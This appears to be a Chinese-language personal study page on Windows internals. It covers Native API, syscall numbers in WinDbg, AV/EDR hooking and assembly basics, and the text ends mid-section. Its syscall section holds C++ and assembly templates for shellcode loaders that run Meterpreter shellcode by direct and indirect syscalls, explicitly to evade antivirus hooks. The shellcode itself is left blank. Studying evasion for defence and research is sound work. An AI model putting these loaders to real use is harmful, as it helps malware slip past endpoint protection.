@@ -1,0 +1,1735 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>!!Windows安全笔记 - Share Docs</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "SYSCALL", url: "#_top", children: [
+              {title: "Windows\u73af\u5b89\u5168\u4f53\u7cfb", url: "#windows" },
+              {title: "Windows API", url: "#windows-api" },
+              {title: "Native API", url: "#native-api" },
+              {title: "syscall", url: "#syscall_1" },
+              {title: "SSDT(\u7cfb\u7edf\u670d\u52a1\u63cf\u8ff0\u8868)", url: "#ssdt" },
+              {title: "Hook", url: "#hook" },
+              {title: "\u76f4\u63a5syscall", url: "#syscall_2" },
+              {title: "\u95f4\u63a5syscall", url: "#syscall_3" },
+              {title: "\u7ec3\u4e60", url: "#_2" },
+              {title: "syscall\u7ed5\u8fc7\u7684\u7f3a\u9677", url: "#syscall_5" },
+          ]},
+          {title: "\u6c47\u7f16", url: "#_6", children: [
+              {title: "\u8bed\u6cd5\u98ce\u683c", url: "#_7" },
+              {title: "\u51fd\u6570\u7684\u6d41\u7a0b", url: "#_8" },
+              {title: "\u51fd\u6570\u5e8f\u8a00\u548c\u5c3e\u58f0", url: "#_9" },
+              {title: "\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u53d8\u91cf", url: "#_10" },
+              {title: "\u5bc4\u5b58\u5668", url: "#_11" },
+              {title: "\u5185\u5b58\u6570\u636e\u7ed3\u6784", url: "#_15" },
+              {title: "\u6307\u4ee4", url: "#_20" },
+              {title: "\u6807\u5fd7\u4f4d", url: "#_23" },
+              {title: "\u6c47\u7f16\u4e2d\u7684\u6d41\u7a0b\u63a7\u5236", url: "#_24" },
+              {title: "\u6c47\u7f16\u4e2d\u7684\u7b97\u672f", url: "#_25" },
+              {title: "\u6c47\u7f16\u4e2d\u7684\u6d6e\u70b9\u6570", url: "#_26" },
+              {title: "\u7f13\u51b2\u533a\u6ea2\u51fa", url: "#_27" },
+              {title: "\u4ee3\u7801\u6267\u884c\u6d41\u91cd\u5b9a\u5411\u6d41\u6307\u4ee4", url: "#_29" },
+              {title: "egghunter", url: "#egghunter" },
+              {title: "\u7528\u6237\u6a21\u5757\u548c\u7cfb\u7edf\u6a21\u5757\u91cd\u5b9a\u5411\u6307\u4ee4\u5730\u5740\u95ee\u9898", url: "#_30" },
+              {title: "ROP", url: "#rop" },
+              {title: "SEH\u6ea2\u51fa\u653b\u51fb", url: "#seh" },
+              {title: "ASLR(Address Space Layout Randomization)\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316", url: "#aslraddress-space-layout-randomization" },
+              {title: "\u8c03\u7528\u7ea6\u5b9a", url: "#_31" },
+              {title: "\u7b80\u5355exe\u5206\u6790", url: "#exe" },
+              {title: "\u7b80\u5355DLL\u5206\u6790", url: "#dll" },
+              {title: "\u7834\u89e3\u8f6f\u4ef6\u7684\u8981\u70b9", url: "#_34" },
+              {title: "\u8131\u58f3", url: "#_35" },
+          ]},
+          {title: "\u6982\u5ff5\u0026amp;\u672f\u8bed", url: "#_36", children: [
+              {title: "UIPI   (User Interface Privilege Isolation)", url: "#uipi-user-interface-privilege-isolation" },
+              {title: "SSPI  (Security Support Provider Interface)", url: "#sspi-security-support-provider-interface" },
+              {title: "Bit \u0026amp; Bytes", url: "#bit-bytes" },
+              {title: "\u4e8c\u8fdb\u5236\u8fd0\u7b97", url: "#_37" },
+          ]},
+          {title: "\u8fd0\u884c\u5e93\u0026amp;\u51fd\u6570", url: "#_38", children: [
+              {title: "_set_app_type", url: "#_set_app_type" },
+              {title: "controlfp", url: "#controlfp" },
+              {title: "_iob_func", url: "#_iob_func" },
+              {title: "_InterlockedCompareExchange64", url: "#_interlockedcompareexchange64" },
+          ]},
+          {title: "SEH", url: "#seh_1", children: [
+          ]},
+          {title: "APC", url: "#apc", children: [
+          ]},
+          {title: "Windbg", url: "#windbg", children: [
+              {title: "\u5e38\u7528\u547d\u4ee4", url: "#_39" },
+              {title: "debug kernel", url: "#debug-kernel" },
+          ]},
+          {title: "\u4e66\u7c4d\u5de5\u5177", url: "#_40", children: [
+              {title: "Reverse Engineering for Beginners", url: "#reverse-engineering-for-beginners" },
+              {title: "Windows \u4ee4\u724c\u76f8\u5173\u5b66\u4e60", url: "#windows_1" },
+              {title: "\u5de5\u5177", url: "#_41" },
+              {title: "\u53c2\u8003\u8d44\u6599", url: "#_43" },
+          ]},
+          {title: "\u547d\u4ee4", url: "#_44", children: [
+          ]},
+          {title: "\u5de5\u5177", url: "#_45", children: [
+              {title: "boofuzz\u4f7f\u7528", url: "#boofuzz" },
+              {title: "x64dbg\u5b89\u88c5mona\u63d2\u4ef6", url: "#x64dbgmona" },
+          ]},
+          {title: "\u4e66\u7c4d", url: "#_46", children: [
+          ]},
+          {title: "\u518d\u770b", url: "#_47", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/" class="btn btn-xs btn-link">
+        Windows API示例大全
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-link">
+        K8s攻击面
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <p># 2023-10-17</p>
+<h2 id="syscall">SYSCALL</h2>
+<p>https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/</p>
+<h3 id="windows">Windows环安全体系</h3>
+<p>Ring0和Ring3分别代表内核层和用户层</p>
+<p><img alt="" src="../../images/20230914110748.png" /></p>
+<h3 id="windows-api">Windows API</h3>
+<p>Windows提供给使用者的各种接口，对应的DLL一般是</p>
+<pre><code>User32.dll
+Kernel32.dll
+Advapi.dll
+</code></pre>
+<p>这些接口的Windows API是不带前缀的</p>
+<h3 id="native-api">Native API</h3>
+<p>更低级的接口，原生API。可以直接对系统层进行操作，这些函数带有前缀Nt、Zw，例如</p>
+<pre><code>NtCreateFile
+NtWriteVirtualMemory
+ZwCreateFile
+</code></pre>
+<p>对应的DLL是</p>
+<pre><code>ntdll.dll
+win32u.dll
+</code></pre>
+<h3 id="syscall_1">syscall</h3>
+<p>Native API的syscall是syscall stub的一部分，
+syscall stub是一组汇编指令，对于不同Native API的syscall stub，移动到eax的寄存器，会有着不同的SSN（系统服务编号）</p>
+<p>也可以说是用户层到系统层的桥梁</p>
+<h3 id="ssdt">SSDT(系统服务描述表)</h3>
+<p>KiSystemCall 用于根据SSN在SSDT中查找对应的系统函数代码</p>
+<h3 id="hook">Hook</h3>
+<h4 id="api-hook-inline-api-hooking">内联API hook  Inline API Hooking</h4>
+<p>大多数杀毒、EDR会采用的hook方式，在原生API执行syscall之前将其重定向至杀毒</p>
+<h4 id="iathook-import-address-table-iat-hooking">IAT导入地址表hook   Import Address Table (IAT) Hooking</h4>
+<h4 id="ssdt-hook-ssdt-hooking-windows-kernel">SSDT hook  SSDT Hooking (Windows Kernel)</h4>
+<p>在内核层的hook方式，在windows引入KPP（Kernel Patch Protection）保护后禁止了这种技术</p>
+<h4 id="_1">重要的是</h4>
+<ul>
+<li>反病毒软件会在不同的dll中hook不同的API</li>
+<li>反病毒软件不可能hook所有API，这对系统的性能有所影响</li>
+</ul>
+<h3 id="syscall_2">直接syscall</h3>
+<p>直接系统调用是不依赖系统存根的syscall，而是自己写汇编指令去syscall</p>
+<p><img alt="" src="../../images/20230914134454.png" /></p>
+<h3 id="syscall_3">间接syscall</h3>
+<p>间接syscall是直接执行到syscall前一步，再使用函数原本的syscall继续执行，伪装正常程序。</p>
+<p><img alt="" src="../../images/20230915112654.png" /></p>
+<pre><code class="language-C">
+UINT_PTR sysAddrNtAllocateVirtualMemory;   //定义syscall指针类型
+
+
+int main() {
+
+     //找到NtAllocateVirtualMemory函数的地址
+    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, &quot;NtAllocateVirtualMemory&quot;);
+
+    //由于NtAllocateVirtualMemory函数后的12个字节便是syscall指令，pNtAllocateVirtualMemory+0x12可计算出syscall指令的位置，这就是与直接syscall不同的地方——直接syscall是直接写汇编手动syscall，这里是找到系统本身的syscall地址用系统的syscall。得到sysAddrNtAllocateVirtualMemory后放入asm中
+    sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
+
+</code></pre>
+<pre><code class="language-asm">EXTERN sysAddrNtAllocateVirtualMemory:QWORD         ; The actual address of the NtAllocateVirtualMemory syscall in ntdll.dll.
+
+
+
+.CODE  ; Start the code section
+
+NtAllocateVirtualMemory PROC
+    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
+    mov eax, 18h                                    ; Move the syscall number into the eax register.
+    jmp QWORD PTR [sysAddrNtAllocateVirtualMemory]  ; Jump to the actual syscall.
+NtAllocateVirtualMemory ENDP                        ; End of the procedure.
+
+END  ; End of the module
+</code></pre>
+<h3 id="_2">练习</h3>
+<h4 id="ssn">调试进程，找到指定函数SSN</h4>
+<p>找到函数的SSN</p>
+<p><code>NtAllocateVirtualMemory</code></p>
+<p>使用<code>x</code>查询内存地址，使用<code>u</code>查询函数的syscall</p>
+<p>先用<code>x</code>查<code>ntdll</code>中的<code>NtAllocateVirtualMemory</code>内存地址，在用<code>u</code>查内存地址00007ffe`9794f040d的syscall，eax后面的编号就是SSN</p>
+<pre><code>0:015&gt; x ntdll!NtAllocateVirtualMemory
+00007ffe`9794f040 ntdll!NtAllocateVirtualMemory (NtAllocateVirtualMemory)
+0:015&gt; u 00007ffe`9794f040 
+ntdll!NtAllocateVirtualMemory:
+00007ffe`9794f040 4c8bd1          mov     r10,rcx
+00007ffe`9794f043 b818000000      mov     eax,18h
+00007ffe`9794f048 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
+00007ffe`9794f050 7503            jne     ntdll!NtAllocateVirtualMemory+0x15 (00007ffe`9794f055)
+00007ffe`9794f052 0f05            syscall
+00007ffe`9794f054 c3              ret
+00007ffe`9794f055 cd2e            int     2Eh
+00007ffe`9794f057 c3              ret
+</code></pre>
+<p>直接用<code>u</code>指定查函数的syscall</p>
+<pre><code>0:015&gt; u NtWriteVirtualMemory
+ntdll!NtWriteVirtualMemory:
+00007ffe`9794f480 4c8bd1          mov     r10,rcx
+00007ffe`9794f483 b83a000000      mov     eax,3Ah
+00007ffe`9794f488 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
+00007ffe`9794f490 7503            jne     ntdll!NtWriteVirtualMemory+0x15 (00007ffe`9794f495)
+00007ffe`9794f492 0f05            syscall
+00007ffe`9794f494 c3              ret
+00007ffe`9794f495 cd2e            int     2Eh
+00007ffe`9794f497 c3              ret
+</code></pre>
+<h4 id="procmonwritefile">procmon查看WriteFile的流程</h4>
+<p>通过过滤进程和<code>WriteFile</code>操作，可以看到notepad进程从用户模式到系统层最后访问磁盘的流程
+<img alt="" src="../../images/20230914133509.png" /></p>
+<h4 id="windows-apishellcode">使用Windows API执行shellcode并动态调试</h4>
+<p>简单加载器</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+// Define the thread function for executing shellcode
+// This function will be executed in a separate thread created later in the main function
+DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
+    // Create a function pointer called 'shellcode' and initialize it with the address of the shellcode
+    void (*shellcode)() = (void (*)())lpParam;
+
+    // Call the shellcode function using the function pointer
+    shellcode();
+
+    return 0;
+}
+
+int main() {
+    // Insert the Meterpreter shellcode 
+    unsigned char code[] = &quot;\xfc....&quot;;
+
+    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    SIZE_T bytesWritten;
+    WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &amp;bytesWritten);
+
+    HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL);
+
+    // This ensures the main thread doesn't exit before the shellcode has finished running
+    WaitForSingleObject(hThread, INFINITE);
+
+
+    // Return 0 as the main function exit code
+    return 0;
+}
+
+</code></pre>
+<p>在符号处可以看到导入的windows api
+<img alt="" src="../../images/20230914163442.png" />
+点击转入导入地址可以查看对应汇编代码
+<img alt="" src="../../images/20230914163532.png" /></p>
+<p>再继续跳转，来到了对应的原生API
+<img alt="" src="../../images/20230914163611.png" /></p>
+<p>继续跳转，可以看到原生API对应的syscall
+<img alt="" src="../../images/20230914163704.png" /></p>
+<p>如果在<code>WriteProcessMemory</code>处下断点，继续运行程序，在第R8可以找到shellcode的内存位置
+<img alt="" src="../../images/20230914164641.png" /></p>
+<h4 id="apishellcode">使用原生API执行shellcode并动态调试</h4>
+<h5 id="_3">定义指针类型函数</h5>
+<ul>
+<li><code>VirtualAlloc</code>对应的原生函数<code>NtAllocateVirtualMemory</code></li>
+<li><code>WriteProcessMemory</code>对应的原生函数<code>NtWriteVirtualMemory</code></li>
+<li><code>CreateThread</code>对应的原生函数<code>NtCreateThreadEx</code></li>
+<li><code>WaitForSingleObject</code>对应的原生函数<code>NtWaitForSingleObject</code></li>
+</ul>
+<p>如果要找哪个Windows API对应的哪个原生函数，可以使用动态调试去找</p>
+<p>定义指针类型函数</p>
+<pre><code class="language-C++">typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER);
+</code></pre>
+<h5 id="_4">获取原生函数的内存地址</h5>
+<p>打开<code>ntdll.dll</code>的句柄，通过原生函数的名称去在内存中查找地址</p>
+<pre><code class="language-cpp">    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtAllocateVirtualMemory&quot;);
+    PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtWriteVirtualMemory&quot;);
+    PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtCreateThreadEx&quot;);
+    PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtWaitForSingleObject&quot;);
+</code></pre>
+<pre><code class="language-C++">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+// Define typedefs for function pointers to the native API functions we'll be using.
+// These match the function signatures of the respective functions.
+typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER);
+
+
+int main() {
+    // Insert Meterpreter shellcode here.
+    unsigned char code[] = &quot;&quot;;
+
+    // Here we load the native API functions from ntdll.dll using GetProcAddress, which retrieves the address of an exported function
+    // or variable from the specified dynamic-link library (DLL). The return value is then cast to the appropriate function pointer typedef.
+    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtAllocateVirtualMemory&quot;);
+    PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtWriteVirtualMemory&quot;);
+    PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtCreateThreadEx&quot;);
+    PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtWaitForSingleObject&quot;);
+
+    // Allocate a region of virtual memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode.
+    // 'exec' will hold the base address of the allocated memory region.
+    void* exec = NULL;
+    SIZE_T size = sizeof(code);
+    NtAllocateVirtualMemory(GetCurrentProcess(), &amp;exec, 0, &amp;size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    // Copy the shellcode into the allocated memory region.
+    SIZE_T bytesWritten;
+    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &amp;bytesWritten);
+
+    // Execute the shellcode in memory using a new thread.
+    HANDLE hThread;
+    NtCreateThreadEx(&amp;hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);
+
+    // Wait for the thread to finish executing.
+    NtWaitForSingleObject(hThread, FALSE, NULL);
+
+    return 0;
+}
+
+</code></pre>
+<p><img alt="" src="../../images/20230914173837.png" /></p>
+<h4 id="syscallshellcode">使用直接syscall执行shellcode并动态调试</h4>
+<h6 id="_5">定义原生函数的结构体</h6>
+<p>新建一个头文件，定义需要使用的原生函数的结构体</p>
+<pre><code class="language-cpp">#ifndef _SYSCALLS_H  // If _SYSCALLS_H is not defined then define it and the contents below. This is to prevent double inclusion.
+#define _SYSCALLS_H  // Define _SYSCALLS_H
+
+#include &lt;windows.h&gt;  // Include the Windows API header
+
+// The type NTSTATUS is typically defined in the Windows headers as a long.
+typedef long NTSTATUS;  // Define NTSTATUS as a long
+typedef NTSTATUS* PNTSTATUS;  // Define a pointer to NTSTATUS
+
+// Declare the function prototype for NtAllocateVirtualMemory
+extern NTSTATUS NtAllocateVirtualMemory(
+    HANDLE ProcessHandle,    // Handle to the process in which to allocate the memory
+    PVOID* BaseAddress,      // Pointer to the base address
+    ULONG_PTR ZeroBits,      // Number of high-order address bits that must be zero in the base address of the section view
+    PSIZE_T RegionSize,      // Pointer to the size of the region
+    ULONG AllocationType,    // Type of allocation
+    ULONG Protect            // Memory protection for the region of pages
+);
+
+// Declare the function prototype for NtWriteVirtualMemory
+extern NTSTATUS NtWriteVirtualMemory(
+    HANDLE ProcessHandle,     // Handle to the process in which to write the memory
+    PVOID BaseAddress,        // Pointer to the base address
+    PVOID Buffer,             // Buffer containing data to be written
+    SIZE_T NumberOfBytesToWrite, // Number of bytes to be written
+    PULONG NumberOfBytesWritten // Pointer to the variable that receives the number of bytes written
+);
+
+// Declare the function prototype for NtCreateThreadEx
+extern NTSTATUS NtCreateThreadEx(
+    PHANDLE ThreadHandle,        // Pointer to a variable that receives a handle to the new thread
+    ACCESS_MASK DesiredAccess,   // Desired access to the thread
+    PVOID ObjectAttributes,      // Pointer to an OBJECT_ATTRIBUTES structure that specifies the object's attributes
+    HANDLE ProcessHandle,        // Handle to the process in which the thread is to be created
+    PVOID lpStartAddress,        // Pointer to the application-defined function of type LPTHREAD_START_ROUTINE to be executed by the thread
+    PVOID lpParameter,           // Pointer to a variable to be passed to the thread
+    ULONG Flags,                 // Flags that control the creation of the thread
+    SIZE_T StackZeroBits,        // A pointer to a variable that specifies the number of high-order address bits that must be zero in the stack pointer
+    SIZE_T SizeOfStackCommit,    // The size of the stack that must be committed at thread creation
+    SIZE_T SizeOfStackReserve,   // The size of the stack that must be reserved at thread creation
+    PVOID lpBytesBuffer          // Pointer to a variable that receives any output data from the system
+);
+
+// Declare the function prototype for NtWaitForSingleObject
+extern NTSTATUS NtWaitForSingleObject(
+    HANDLE Handle,          // Handle to the object to be waited on
+    BOOLEAN Alertable,      // If set to TRUE, the function returns when the system queues an I/O completion routine or APC for the thread
+    PLARGE_INTEGER Timeout  // Pointer to a LARGE_INTEGER that specifies the absolute or relative time at which the function should return, regardless of the state of the object
+);
+
+#endif // _SYSCALLS_H  // End of the _SYSCALLS_H definition
+
+
+</code></pre>
+<h6 id="syscall_4">定义原生函数的syscall过程</h6>
+<pre><code class="language-asm">.CODE  ; Start the code section
+; Procedure for the NtAllocateVirtualMemory syscall
+NtAllocateVirtualMemory PROC
+    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
+    mov eax, 18h                                    ; Move the syscall number into the eax register.
+    syscall                                         ; Execute syscall.
+    ret                                             ; Return from the procedure.
+NtAllocateVirtualMemory ENDP                        ; End of the procedure.
+
+; Similar procedures for NtWriteVirtualMemory syscalls
+NtWriteVirtualMemory PROC
+    mov r10, rcx
+    mov eax, 3Ah 
+    syscall
+    ret
+NtWriteVirtualMemory ENDP
+
+; Similar procedures for NtCreateThreadEx syscalls
+NtCreateThreadEx PROC
+    mov r10, rcx
+    mov eax, 0C2h
+    syscall
+    ret
+NtCreateThreadEx ENDP
+
+; Similar procedures for NtWaitForSingleObject syscalls
+NtWaitForSingleObject PROC
+    mov r10, rcx
+    mov eax, 4
+    syscall
+    ret
+NtWaitForSingleObject ENDP
+
+END  ; End of the module
+</code></pre>
+<p>运行起来后在加载函数中没有几个重要函数
+<img alt="" src="../../images/20230915103754.png" /></p>
+<h4 id="syscallshellcode_1">使用间接syscall执行shellcode并动态调试</h4>
+<pre><code>流程
+- 获取ntdll.dll的句柄
+- 初始化原生函数指针地址
+- 定义要使用的函数结构体
+- 定义要使用的原生函数的syscall的地址指针，并设置从ntdll中获取到的函数指针地址，0x12的偏移量。这是因为要获取函数初始地址到syscall的地址，这也是间接syscall的核心————绕过Win32 API到找原生API的过程，去调用函数原本的syscall，直接syscall则是既绕过Win32 API到找原生API，又绕过函数原生的syscall。
+
+</code></pre>
+<p><img alt="" src="../../images/20230915114659.png" /></p>
+<h3 id="syscall_5">syscall绕过的缺陷</h3>
+<ul>
+<li>由于固定了syscall的调用代码，汇编指令的特征会被静态监测到。</li>
+</ul>
+<p><img alt="" src="../../images/20230915160923.png" />
+<img alt="" src="../../images/20230915161029.png" /></p>
+<ul>
+<li>实现绕过杀软除了使用syscall外，还需要解决其他的问题比如其他api hook问题、shellcode内存分配问题、全栈行为异常问题。简单说是需要结合各种手段模拟出真实的程序运行的内存调用，以达成最好的免杀效果。</li>
+</ul>
+<h2 id="_6">汇编</h2>
+<h3 id="_7">语法风格</h3>
+<p>根据语法风格分成Intel和AT&amp;T，Windows用的是Inter</p>
+<pre><code>Inter和AT&amp;T区别如下
+- Inter语法是 &lt;指令 目标,源&gt;；AT&amp;T语法是&lt;指令 源;目标&gt;
+- AT&amp;T语法在注册名称之前必须写百分号(%)，数字之前写美元号($)。地址使用圆括号。
+- AT&amp;T语法在指令中添加后缀来定义操作数的大小
+q - quad 64bits 8bytes   
+l - long 32bits 4bytes   
+w - word 16bits 2bytes   
+b - byte 8bits  1bytes
+
+</code></pre>
+<h3 id="_8">函数的流程</h3>
+<p>汇编中的函数特征非常明显，弄清除函数的功能是非常关键的</p>
+<pre><code>1. 调用者将被调函数所需的参数放入指定位置，根据调用约定不同，位置不同，有的放入寄存器，有的全放入栈
+2. CALL指令跳转到指定函数
+3. 被调函数配置一个指针用来保存保持不变的寄存器值
+4. 为被调函数局部变量在栈上分配空间，PUSH指令
+5. 被调函数执行过程，访问参寄存器的参数，并给寄存器返回结果
+6. 被调函数执行完成后，释放栈空间，POP指令
+7. 还原第3步中的值
+8. 函数返回，RET指令
+9. 调用者还原寄存器的值
+
+3-4属于函数序言
+6-8属于函数尾声
+
+
+</code></pre>
+<h3 id="_9">函数序言和尾声</h3>
+<pre><code>函数序言(function prolog)是函数开始时的指令序列，为了EBP中的值在函数执行期间保持不变，好让EBP可以用于访问局部变量和参数。它通常看起来像下面的代码片段:
+push ebp
+mov ebp, esp
+sub esp, X
+
+函数尾声释放栈中分配的空间，将EBP寄存器中的值返回到其初始状态，并将控制流返回给调用者
+mov esp, ebp
+pop ebp
+ret 0
+
+函数序言和尾声通常在反汇编程序中检测，用于函数定界
+
+</code></pre>
+<p>下面是在linux上生产的汇编码
+<img alt="" src="../../images/20230921103440.png" /></p>
+<h3 id="_10">全局变量和局部变量</h3>
+<p>在汇编中全局变量会被自动初始化为0，局部变量不会</p>
+<h3 id="_11">寄存器</h3>
+<p><strong>General Purpose Registers (GPR)</strong></p>
+<pre><code>RAX - accumulator register 累加器寄存器。通常用于存储函数的返回值
+RBX - base register 基础寄存器。有时用作内存访问的基准指针
+RDX - data register 数据寄存器
+RCX - counter register 有时被称为计数器寄存器。用作循环计数器
+
+RSI - source index 被称为源索引。用于字符串操作的源指针。
+RDI - destination index 称为目标索引。在字符串操作中用作目标指针
+
+RSP - stack pointer 栈指针。保存栈顶部的地址。
+RBP - base pointer 基指针。保存堆栈底部的地址。
+EIP/RIP - Instruction Pointer  指令指针。保存下一行要执行代码的地址
+
+</code></pre>
+<h4 id="_12">不同位数的寄存器</h4>
+<pre><code>CPU是一步步进化而来的，所以针对不同位数有不同的寄存器。
+R开头的寄存器是64位程序的     大小8字节
+E开头的寄存器是32位程序的     大小4字节
+A开头的寄存器是16位程序的     大小2字节
+
+在一个64位程序中，同时存在64位、32位、16位、8位寄存器。
+比如，64位中RAX的后32位为EAX，后16位为AX（16位为高位AH和低位AL组成）
+
+</code></pre>
+<h4 id="_13">存储浮点数的寄存器</h4>
+<p>浮点数值被存储在<code>YMM*</code>寄存器中，对应的32位寄存器是<code>XMM*</code></p>
+<h4 id="_14">存储整形的寄存器</h4>
+<p>R8 至 R15寄存器用来存储整形</p>
+<h3 id="_15">内存数据结构</h3>
+<h4 id="_16">内存结构</h4>
+<pre><code>Stack  栈
+Heap   堆
+.data  包含初始化为非零值的全局和静态数据
+.bss   包含未初始化或初始化为零的全局和静态数据
+.text  包含程序的代码
+
+</code></pre>
+<p><img alt="" src="../../images/20230918122448.png" /></p>
+<p>上图的介绍</p>
+<pre><code>栈 - 存储固定大小数据，后进先出原则，入栈RSP会增加，出栈RSP会减小，RBP始终不变
+堆 - 可变的存储空间
+程序镜像 - 载入到内存中的PE文件
+TEB - 线程环境块
+PEB - 进程环境块
+
+</code></pre>
+<h4 id="_17">栈帧</h4>
+<p>栈的基础单元</p>
+<h4 id="_18">端序</h4>
+<p>一种内存数据的排列方式，这将影响到调试过程中看到内存的数据顺序问题，默认是采用小端序来在内存中存储数据的，这也就是为什么在内存中看到的数据和实际的数据是相反的
+大端序： 小值存高位，大值存低位
+小端序： 大值存低位，小值存高位</p>
+<h4 id="_19">栈</h4>
+<p>栈的增长是从大到小的，栈底是大地址，栈顶是小地址。入栈会减小栈顶地址，出栈会增大栈顶地址。
+使用无限循环递归会导致栈溢出</p>
+<pre><code class="language-c++">void main()
+{
+    main();
+}
+
+</code></pre>
+<p>编译器关闭优化
+<img alt="" src="../../images/20230921133502.png" />
+RSP到最小值了
+<img alt="" src="../../images/20230921133529.png" /></p>
+<h3 id="_20">指令</h3>
+<p>直接值、寄存器、内存/内存地址</p>
+<p>汇编指令的格式</p>
+<pre><code>操作符 目标,源
